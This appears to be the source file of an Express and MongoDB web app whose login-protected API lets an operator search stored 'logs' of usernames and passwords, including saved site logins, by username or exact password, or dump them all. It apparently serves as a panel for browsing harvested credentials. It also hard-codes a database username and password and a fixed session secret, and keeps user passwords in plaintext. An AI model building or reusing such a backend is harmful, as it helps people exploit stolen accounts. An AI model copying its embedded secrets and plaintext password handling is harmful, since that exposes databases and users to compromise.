const express = require('express')
const ejs = require('ejs');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const session = require('express-session')
const mongodbSession = require('connect-mongodb-session')(session)

const app = express();
app.set('view engine', 'ejs');
app.use(bodyParser.urlencoded({ extended: true }));

mongoose.connect('mongodb+srv://cic:sai4502@cluster0.osbc1fv.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0').then(()=>{
    console.log('connected');
})

const isAuth = (req,res,next)=>{
    if(req.session.isLoggedin == true){
        next()
    }else{
        res.redirect('/login')
    }
}

const islogin = (req,res,next)=>{
    if(req.session.isLoggedin == true){
        res.redirect('/')
    }else{
        next()
    }
}

const store = new mongodbSession({
    uri: "mongodb+srv://cic:sai4502@cluster0.osbc1fv.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0",
    collection: 'session'
})
app.use(session({
    secret: "this is secret key",
    resave: false,
    saveUninitialized: false,
    store: store
}))

const linkSchema = new mongoose.Schema({
    url: {type: String},
    username: {type: String},
    password: {type: String}
});

const logsSchema = new mongoose.Schema({
    username: {type:String,required:true},
    password: {type:String},
    links: [linkSchema]
});

const Logs = mongoose.model('logs',logsSchema);

const userSchema = new mongoose.Schema({
    name: {type:String},
    username: {type:String,required:true,unique:true},
    password: {type:String,required:true},
    role: {type:Number,default:1},
})
const Users = mongoose.model('users',userSchema)

app.get('/api/findby/username/:id',isAuth,async(req,res)=>{
    let logs = await Logs.find({username:req.params.id},);
    res.json(logs);
})

app.get('/api/findby/username/',isAuth,async(req,res)=>{
    res.json("Please provide username after /");
})

app.get('/api/findby/password/:id',isAuth,async(req,res)=>{
    let logs = await Logs.find({password:req.params.id},);
    res.json(logs);
})

app.get('/api/findby/password/',isAuth,async(req,res)=>{
    res.json("Please provide password after /");
})

app.get('/api/getall',isAuth,async(req,res)=>{
    let logs = await Logs.find();
    res.json(logs);
})

app.get('/login',islogin,(req,res)=>{
    res.render('login');
})

app.post('/login',async(req,res)=>{
    let user = await Users.findOne({username:req.body.username});
    if(user){
        if(user.password == req.body.password){
            req.session.isLoggedin = true
            req.session.user = user
            res.redirect('/');
        }
        else{
            res.redirect('/login');
        }
    }
    else{
        res.redirect('/login');
    }
})

app.get('/',isAuth,(req, res) => {
    res.render('home');
})

app.get('*',isAuth,(req,res)=>{
    res.render('404')
})

app.listen(8000,()=>{
    console.log('Server is running at port 8000');
})